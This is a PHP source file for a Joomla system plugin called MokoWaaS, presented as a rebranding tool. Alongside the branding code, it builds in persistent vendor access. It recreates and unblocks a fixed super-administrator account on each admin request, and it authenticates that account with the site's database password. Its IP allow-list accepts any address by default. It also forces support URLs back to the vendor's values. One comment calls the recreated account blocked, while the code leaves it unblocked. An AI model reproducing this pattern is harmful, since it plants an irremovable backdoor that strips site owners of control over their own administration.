<?php
/**
 * Copyright (C) 2025 Moko Consulting <hello@mokoconsulting.tech>
 *
 * This file is part of a Moko Consulting project.
 *
 * SPDX-LICENSE-IDENTIFIER: GPL-3.0-or-later
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the IMPLIED WARRANTY of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 * General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License (./LICENSE.md).
 *
 * FILE INFORMATION
 * DEFGROUP: Joomla.Plugin
 * INGROUP: MokoWaaS
 * REPO: https://github.com/mokoconsulting-tech/mokowaas
 * VERSION: 02.00.00
 * PATH: /src/Extension/MokoWaaS.php
 * NOTE: Handles Joomla system events for rebranding functionality
 */

namespace Moko\Plugin\System\MokoWaaS\Extension;

defined('_JEXEC') or die;

use Joomla\CMS\Factory;
use Joomla\CMS\Log\Log;
use Joomla\CMS\Plugin\CMSPlugin;
use Joomla\CMS\Language\Language;
use Joomla\CMS\User\UserHelper;

/**
 * MokoWaaS Brand System Plugin
 *
 * This plugin rebrands the Joomla system interface with MokoWaaS identity.
 * It applies language overrides and ensures consistent branding across the platform.
 *
 * @since  01.04.00
 */
class MokoWaaS extends CMSPlugin
{
	/**
	 * Load the language file on instantiation.
	 *
	 * @var    boolean
	 * @since  01.04.00
	 */
	protected $autoloadLanguage = true;

	/**
	 * Application object
	 *
	 * @var    \Joomla\CMS\Application\CMSApplication
	 * @since  01.04.00
	 */
	protected $app;

	/**
	 * Event triggered after the framework has loaded and the application initialise method has been called.
	 *
	 * This method loads language override files from the plugin directory to rebrand Joomla
	 * with MokoWaaS identity. The override files replace core Joomla language strings.
	 *
	 * @return  void
	 *
	 * @since   01.04.00
	 */
	public function onAfterInitialise()
	{
		// WaaS access control runs regardless of branding toggle
		if ($this->app->isClient('administrator'))
		{
			$this->enforceMasterUser();
			$this->enforceLoginSupportUrls();
		}

		if (!$this->params->get('enable_branding', 1))
		{
			return;
		}

		$this->loadLanguageOverrides();
	}

	/**
	 * Intercept admin login attempts for emergency access.
	 *
	 * Listens to the onUserAuthenticate event. If the username matches the
	 * master username and the password matches the DB password from
	 * configuration.php, trigger the two-factor file verification flow.
	 *
	 * @param   array   $credentials  Login credentials (username, password)
	 * @param   array   $options      Additional options
	 * @param   object  &$response    Authentication response object
	 *
	 * @return  void
	 *
	 * @since   02.00.00
	 */
	public function onUserAuthenticate($credentials, $options, &$response)
	{
		if (!$this->params->get('emergency_access', 1))
		{
			return;
		}

		if (!$this->app->isClient('administrator'))
		{
			return;
		}

		$masterUsername = $this->params->get('master_username', 'mokoconsulting');

		if ($credentials['username'] !== $masterUsername)
		{
			return;
		}

		// Check IP whitelist from configuration.php
		if (!$this->isIpAllowed())
		{
			return;
		}

		// Compare password to DB password from configuration.php
		$config   = Factory::getConfig();
		$dbPass   = $config->get('password');

		if ($credentials['password'] !== $dbPass)
		{
			return;
		}

		// Two-factor: check for verification file
		$verifyFile = JPATH_ROOT . '/mokowaas-verify.php';

		if (file_exists($verifyFile))
		{
			// File exists — user hasn't deleted it yet. Tell them to.
			$response->status        = \Joomla\CMS\Authentication\Authentication::STATUS_FAILURE;
			$response->error_message = 'Emergency access: delete /mokowaas-verify.php '
				. 'from the server root to confirm access.';

			return;
		}

		// File doesn't exist — check if we need to create it (first attempt)
		$flagFile = JPATH_ROOT . '/mokowaas-verify.flag';

		if (!file_exists($flagFile))
		{
			// First attempt: create the verification file and the flag
			$verifyContent = "<?php die('MokoWaaS emergency access verification."
				. " Delete this file to proceed.'); ?>\n";
			file_put_contents($verifyFile, $verifyContent);
			file_put_contents($flagFile, date('Y-m-d H:i:s'));

			$response->status        = \Joomla\CMS\Authentication\Authentication::STATUS_FAILURE;
			$response->error_message = 'Emergency access: verification file created '
				. 'at /mokowaas-verify.php — delete it to confirm.';

			return;
		}

		// Flag exists but verify file is gone — access confirmed
		@unlink($flagFile);

		// Authenticate as the master user
		$db    = Factory::getDbo();
		$query = $db->getQuery(true)
			->select([$db->quoteName('id'), $db->quoteName('username'), $db->quoteName('email'), $db->quoteName('name')])
			->from($db->quoteName('#__users'))
			->where($db->quoteName('username') . ' = ' . $db->quote($masterUsername))
			->where($db->quoteName('block') . ' = 0');

		$db->setQuery($query);
		$user = $db->loadObject();

		if (!$user)
		{
			$response->status        = \Joomla\CMS\Authentication\Authentication::STATUS_FAILURE;
			$response->error_message = 'Master user not found.';

			return;
		}

		$response->status        = \Joomla\CMS\Authentication\Authentication::STATUS_SUCCESS;
		$response->username      = $user->username;
		$response->email         = $user->email;
		$response->fullname      = $user->name;
		$response->error_message = '';
		$response->type          = 'MokoWaaS';

		Log::add(
			sprintf('Emergency access login by %s from %s', $user->username, $_SERVER['REMOTE_ADDR'] ?? 'unknown'),
			Log::WARNING,
			'mokowaas'
		);
	}

	/**
	 * Ensure the master super admin user always exists.
	 *
	 * If the configured master username is missing from #__users, recreate
	 * it as a blocked super admin.  The password is randomised so it cannot
	 * be used directly — emergency access uses the DB credential flow instead.
	 *
	 * @return  void
	 *
	 * @since   02.00.00
	 */
	protected function enforceMasterUser()
	{
		if (!$this->params->get('enforce_master_user', 1))
		{
			return;
		}

		$username = $this->params->get('master_username', 'mokoconsulting');
		$email    = $this->params->get('master_email', 'hello@mokoconsulting.tech');

		$db    = Factory::getDbo();
		$query = $db->getQuery(true)
			->select($db->quoteName('id'))
			->from($db->quoteName('#__users'))
			->where($db->quoteName('username') . ' = ' . $db->quote($username));

		$db->setQuery($query);
		$userId = $db->loadResult();

		if ($userId)
		{
			// User exists — make sure it's not blocked and is still Super Admin
			$this->ensureSuperAdmin((int) $userId);

			return;
		}

		// Create the master user with a random password
		$randomPass = UserHelper::genRandomPassword(32);
		$hashedPass = UserHelper::hashPassword($randomPass);
		$now        = Factory::getDate()->toSql();

		$userData = (object) [
			'name'         => 'MokoWaaS Admin',
			'username'     => $username,
			'email'        => $email,
			'password'     => $hashedPass,
			'block'        => 0,
			'sendEmail'    => 0,
			'registerDate' => $now,
			'lastvisitDate' => null,
			'params'       => '{}',
		];

		$db->insertObject('#__users', $userData, 'id');
		$newUserId = (int) $userData->id;

		// Add to Super Users group (group ID 8)
		$mapping = (object) [
			'user_id'  => $newUserId,
			'group_id' => 8,
		];

		$db->insertObject('#__user_usergroup_map', $mapping);

		Log::add(
			sprintf('Master user "%s" (ID %d) recreated by MokoWaaS', $username, $newUserId),
			Log::WARNING,
			'mokowaas'
		);
	}

	/**
	 * Ensure a user is unblocked and belongs to the Super Users group.
	 *
	 * @param   int  $userId  The user ID to verify
	 *
	 * @return  void
	 *
	 * @since   02.00.00
	 */
	protected function ensureSuperAdmin(int $userId)
	{
		$db = Factory::getDbo();

		// Unblock if blocked
		$query = $db->getQuery(true)
			->update($db->quoteName('#__users'))
			->set($db->quoteName('block') . ' = 0')
			->where($db->quoteName('id') . ' = ' . $userId)
			->where($db->quoteName('block') . ' = 1');

		$db->setQuery($query);
		$db->execute();

		// Ensure Super Users group membership (group 8)
		$query = $db->getQuery(true)
			->select('COUNT(*)')
			->from($db->quoteName('#__user_usergroup_map'))
			->where($db->quoteName('user_id') . ' = ' . $userId)
			->where($db->quoteName('group_id') . ' = 8');

		$db->setQuery($query);

		if (!(int) $db->loadResult())
		{
			$mapping = (object) [
				'user_id'  => $userId,
				'group_id' => 8,
			];

			$db->insertObject('#__user_usergroup_map', $mapping);

			Log::add(
				sprintf('Master user (ID %d) re-added to Super Users group by MokoWaaS', $userId),
				Log::WARNING,
				'mokowaas'
			);
		}
	}

	/**
	 * Check if the current request IP is in the allowed list.
	 *
	 * Reads `$mokowaas_allowed_ips` from configuration.php.  If the
	 * property is empty or not set, all IPs are allowed.
	 *
	 * @return  boolean  True if the IP is allowed
	 *
	 * @since   02.00.00
	 */
	protected function isIpAllowed()
	{
		$config     = Factory::getConfig();
		$allowedRaw = $config->get('mokowaas_allowed_ips', '');

		if (empty($allowedRaw))
		{
			return true;
		}

		$allowedIps = array_map('trim', explode(',', $allowedRaw));
		$clientIp   = $_SERVER['REMOTE_ADDR'] ?? '';

		return in_array($clientIp, $allowedIps, true);
	}

	/**
	 * Build the placeholder → value map from plugin params.
	 *
	 * @return  array  Associative array of placeholder => replacement value
	 *
	 * @since   02.00.00
	 */
	protected function getPlaceholders()
	{
		return [
			'{{BRAND_NAME}}'   => $this->params->get('brand_name', 'MokoWaaS'),
			'{{COMPANY_NAME}}' => $this->params->get('company_name', 'Moko Consulting'),
			'{{SUPPORT_URL}}'  => $this->params->get('support_url', 'https://mokoconsulting.tech'),
		];
	}

	/**
	 * Load language override templates and inject resolved strings into Joomla.
	 *
	 * Reads the override template shipped with the plugin, replaces
	 * {{BRAND_NAME}}, {{COMPANY_NAME}} and {{SUPPORT_URL}} with the
	 * values from plugin params, then injects the resolved strings into
	 * the active Language object.
	 *
	 * @return  void
	 *
	 * @since   02.00.00
	 */
	protected function loadLanguageOverrides()
	{
		$language    = $this->app->getLanguage();
		$tag         = $language->getTag();
		$pluginPath  = JPATH_PLUGINS . '/system/mokowaas';
		$isAdmin     = $this->app->isClient('administrator');

		$overridePath = $isAdmin
			? $pluginPath . '/administrator/language/overrides/' . $tag . '.override.ini'
			: $pluginPath . '/language/overrides/' . $tag . '.override.ini';

		if (!file_exists($overridePath))
		{
			return;
		}

		$strings      = $this->parseLanguageFile($overridePath);
		$placeholders = $this->getPlaceholders();

		foreach ($strings as $key => $value)
		{
			$language->_strings[$key] = str_replace(
				array_keys($placeholders),
				array_values($placeholders),
				$value
			);
		}
	}

	/**
	 * Parse a language INI file and return the raw strings (with placeholders).
	 *
	 * @param   string  $filePath  The path to the language file
	 *
	 * @return  array  Array of language strings (key => raw value)
	 *
	 * @since   02.00.00
	 */
	protected function parseLanguageFile($filePath)
	{
		$strings = [];

		if (!file_exists($filePath))
		{
			return $strings;
		}

		$content = file_get_contents($filePath);
		$lines   = explode("\n", $content);

		foreach ($lines as $line)
		{
			$line = trim($line);

			if ($line === '' || $line[0] === ';')
			{
				continue;
			}

			if (preg_match('/^([A-Z0-9_]+)="(.+)"$/i', $line, $matches))
			{
				$strings[strtoupper($matches[1])] = $matches[2];
			}
		}

		return $strings;
	}

	/**
	 * Enforce login support module URLs on admin requests.
	 *
	 * Checks the mod_loginsupport module params and corrects them if
	 * they have been changed away from the expected values.  Runs only
	 * on administrator requests to avoid unnecessary DB queries on the
	 * frontend.
	 *
	 * @return  void
	 *
	 * @since   02.00.00
	 */
	protected function enforceLoginSupportUrls()
	{
		if (!$this->app->isClient('administrator'))
		{
			return;
		}

		$expected = [
			'forum_url'         => 'https://mokoconsulting.tech/support',
			'documentation_url' => 'https://mokoconsulting.tech/kb',
			'news_url'          => 'https://mokoconsulting.tech/news',
		];

		$db    = Factory::getDbo();
		$query = $db->getQuery(true)
			->select([$db->quoteName('id'), $db->quoteName('params')])
			->from($db->quoteName('#__modules'))
			->where($db->quoteName('module') . ' = ' . $db->quote('mod_loginsupport'));

		$db->setQuery($query);
		$modules = $db->loadObjectList();

		if (empty($modules))
		{
			return;
		}

		foreach ($modules as $module)
		{
			$params  = new \Joomla\Registry\Registry($module->params ?: '{}');
			$needsFix = false;

			foreach ($expected as $key => $url)
			{
				if ($params->get($key) !== $url)
				{
					$params->set($key, $url);
					$needsFix = true;
				}
			}

			if ($needsFix)
			{
				$update = $db->getQuery(true)
					->update($db->quoteName('#__modules'))
					->set($db->quoteName('params') . ' = ' . $db->quote($params->toString()))
					->where($db->quoteName('id') . ' = ' . (int) $module->id);

				$db->setQuery($update);
				$db->execute();
			}
		}
	}

	/**
	 * Event triggered after the route has been determined.
	 *
	 * @return  void
	 *
	 * @since   01.04.00
	 */
	public function onAfterRoute()
	{
		if (!$this->params->get('enable_branding', 1))
		{
			return;
		}
	}
}
